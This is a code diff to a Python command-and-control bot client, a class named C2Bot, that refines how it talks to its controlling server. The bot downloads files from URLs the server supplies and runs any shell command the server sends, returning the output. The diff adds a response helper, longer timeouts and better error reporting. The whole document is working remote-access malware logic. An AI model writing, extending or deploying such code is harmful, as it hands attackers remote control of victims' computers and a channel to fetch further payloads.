@@ -11,7 +11,7 @@ import os
 SERVER_IP = '127.0.0.1'  # Change this
 SERVER_PORT = 9000
 HEARTBEAT_INTERVAL = 10  # seconds
-BUFFER_SIZE = 1024       # bytes to read at once
+BUFFER_SIZE = 4096       # bytes to read at once
 
 # ===== BOT LOGIC =====
 
@@ -72,7 +72,7 @@ class C2Bot:
                 buffer += data
                 while b'\n' in buffer:
                     line, buffer = buffer.split(b'\n', 1)
-                    command = line.decode().strip()
+                    command = line.decode(errors='ignore').strip()
                     print(f"[<] Received command: {command}")
 
                     self.handle_command(command)
@@ -85,9 +85,11 @@ class C2Bot:
 
     def handle_command(self, command):
         """Dispatch incoming commands."""
+        if not command:
+            return
+
         if command == "PING":
-            self.sock.sendall(b'PONG\n')
-            print("[>] Sent PONG")
+            self.send_response("PONG")
 
         elif command.startswith("DOWNLOAD "):
             parts = command.split(" ", 2)
@@ -95,7 +97,7 @@ class C2Bot:
                 url, filename = parts[1], parts[2]
                 self.download_file(url, filename)
             else:
-                print("[!] Invalid DOWNLOAD format")
+                self.send_response("DOWNLOAD_FAIL invalid_format")
 
         elif command.startswith("EXECUTE "):
             shell_command = command[len("EXECUTE "):]
@@ -103,42 +105,53 @@ class C2Bot:
 
         else:
             print(f"[!] Unknown command: {command}")
+            self.send_response(f"UNKNOWN_COMMAND {command}")
 
     def download_file(self, url, filename):
         """Download a file from a URL and save locally."""
         try:
-            response = requests.get(url, timeout=10)
+            response = requests.get(url, timeout=15)
             response.raise_for_status()
 
             with open(filename, 'wb') as f:
                 f.write(response.content)
 
-            self.sock.sendall(f"DOWNLOAD_SUCCESS {filename}\n".encode())
+            self.send_response(f"DOWNLOAD_SUCCESS {filename}")
             print(f"[>] Downloaded and saved as {filename}")
 
         except Exception as e:
-            self.sock.sendall(f"DOWNLOAD_FAIL {filename}\n".encode())
+            self.send_response(f"DOWNLOAD_FAIL {filename}")
             print(f"[!] Download failed for {url}: {e}")
 
     def execute_command(self, shell_command):
         """Execute an OS command and send back the result."""
         try:
-            output = subprocess.check_output(shell_command, shell=True, stderr=subprocess.STDOUT, timeout=10)
+            output = subprocess.check_output(shell_command, shell=True, stderr=subprocess.STDOUT, timeout=15)
             result = output.decode(errors='ignore').strip()
             print(f"[>] Command output: {result}")
 
-            # Send back (first 500 chars max to prevent overflow)
+            # Limit output size
             result = (result[:500] + '...') if len(result) > 500 else result
-            self.sock.sendall(f"EXECUTE_RESULT {result}\n".encode())
+            self.send_response(f"EXECUTE_RESULT {result}")
 
         except subprocess.CalledProcessError as e:
             error_output = e.output.decode(errors='ignore').strip()
-            self.sock.sendall(f"EXECUTE_ERROR {error_output}\n".encode())
+            self.send_response(f"EXECUTE_ERROR {error_output}")
             print(f"[!] Command execution error: {error_output}")
 
         except Exception as e:
-            self.sock.sendall(f"EXECUTE_ERROR {str(e)}\n".encode())
+            self.send_response(f"EXECUTE_ERROR {str(e)}")
             print(f"[!] Unknown execution error: {e}")
+
+    def send_response(self, message):
+        """Send a message back to the server."""
+        try:
+            full_message = f"{message}\n".encode()
+            self.sock.sendall(full_message)
+            print(f"[>] Sent response: {message}")
+        except Exception as e:
+            print(f"[!] Failed to send response: {e}")
+            self.running = False
 
     def cleanup(self):
         """Close connection and clean up."""
